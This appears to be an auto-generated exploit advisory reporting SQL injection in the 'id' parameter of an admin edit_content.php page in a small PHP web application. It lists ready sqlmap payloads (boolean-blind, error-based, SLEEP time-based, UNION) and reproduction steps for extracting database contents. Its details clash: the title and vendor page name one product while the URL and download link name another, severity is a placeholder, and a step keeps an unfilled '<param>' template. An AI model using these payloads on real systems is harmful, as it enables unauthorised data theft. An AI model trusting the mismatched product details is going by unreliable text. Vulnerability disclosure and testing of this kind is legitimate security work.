# Exploit Title: Engineers Online Portal – SQL Injection in edit_content.php (`http://localhost/niamunozmonitoringsystem/admin/edit_content.php?id=1`)

**Date:** 2025-08-11  
**Exploit Author:** Anonymous  
**Vendor Homepage:** https://www.sourcecodester.com/php/13115/engineers-online-portal-php.html  
**Software Link:** https://www.sourcecodester.com/sites/default/files/download/oretnom23/nia_munoz_monitoring_system.zip  
**Version:** 1.0.7.18  
**Tested on:** PHP 7.4 on Ubuntu 20.04  

---

## Summary

A SQL Injection vulnerability exists in the `edit_content.php` endpoint of **Engineers Online Portal**. Unsanitized user input in the specified parameter is interpolated directly into an SQL query, allowing attackers to infer or extract data and, in some cases, execute stacked/time-based payloads.  
**Back-end DBMS (as detected):** MySQL >= 5.0 (MariaDB fork)  
**CWE:** CWE-89 (SQL Injection)  
**Severity:** High (placeholder — adjust once CVSS is computed)

## Affected Component & Parameter

### Affected Endpoint

- **URL:** `http://localhost/niamunozmonitoringsystem/admin/edit_content.php?id=1`
- **HTTP Method:** GET
- **Vulnerable File:** `edit_content.php`
- **Parameter:** `id`
- **Vector Location:** GET

### Injection Techniques (as identified by sqlmap)
- **Type:** boolean-based blind
  - **Title:** AND boolean-based blind - WHERE or HAVING clause
  - **Payload:** `id=1' AND 4498=4498-- CVAk`
- **Type:** error-based
  - **Title:** MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
  - **Payload:** 
```
id=1' AND (SELECT 6040 FROM(SELECT COUNT(*),CONCAT(0x7178786b71,(SELECT (ELT(6040=6040,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HxxJ
```
- **Type:** time-based blind
  - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  - **Payload:** `id=1' AND (SELECT 8897 FROM (SELECT(SLEEP(5)))WVAE)-- xzkT`
- **Type:** UNION query
  - **Title:** Generic UNION query (NULL) - 3 columns
  - **Payload:** 
```
id=-9653' UNION ALL SELECT NULL,NULL,CONCAT(0x7178786b71,0x4b624a635178426f6f5a737854667a4e5542784751524e7677786e7979644c5a72416a73466b566e,0x71786a7071)-- -
```



## Proof of Concept (Burp Repeater)

![burp-repeater-poc](poc.png)

## SQLMap Summary

![sqlmap-summary](sqlmap_summary.png)



## Technical Description

The vulnerable parameter is reflected into the SQL statement without proper validation or prepared statements. Boolean-based blind, time-based blind (SLEEP), and/or UNION-based vectors were verified by sqlmap. This enables database enumeration and potential data exfiltration under the privileges of the application’s DB user.

## Impact

- Enumeration of database schemas, tables, and rows  
- Exposure of sensitive user/operational data  
- Potential lateral movement if credentials or session material are stored in DB

## Steps to Reproduce

1. Browse to `http://localhost/niamunozmonitoringsystem/admin/edit_content.php?id=1`.  
2. Intercept the request and inject the provided payload(s) into parameter `edit_content.php?&<param>=...`.  
3. Observe conditional responses / time delays / injected row reflections per technique above.  
4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.

## Vulnerable Code (Screenshot)

![vulnerable-code](code_snippet.png)


References
OWASP: SQL Injection Prevention Cheat Sheet

CWE-89: SQL Injection
